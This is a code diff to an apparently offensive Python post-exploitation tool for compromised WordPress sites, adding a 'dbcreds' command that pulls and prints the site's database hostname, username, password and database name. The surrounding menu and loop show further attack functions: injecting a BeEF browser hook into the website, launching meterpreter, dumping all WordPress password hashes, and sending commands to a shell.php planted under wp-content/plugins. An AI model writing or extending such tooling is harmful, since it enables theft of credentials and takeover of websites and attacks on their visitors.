@@ -80,6 +80,7 @@ def commandloop(host,uploaddir):
                 -------                   -----------
                 ?                         Help menu
                 beef                      Injects a BeEF hook into website
+                dbcreds                   Prints the database credentials
                 exit                      Terminate the session
                 hashdump                  Dumps all WordPress password hashes
                 help                      Help menu
@@ -105,6 +106,12 @@ def commandloop(host,uploaddir):
             meterpreter(host, uploaddir)
         elif cmd == "beef":
             beefhook(host, uploaddir)
+        elif cmd == "dbcreds":
+            creds = datacreds(host, uploaddir)
+            print "Hostname: " + creds[0]
+            print "Username: " +creds[1]
+            print "Password: " +creds[2]
+            print "Database: " + creds[3]
         else:
             print "Sent command: " + cmd
             sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
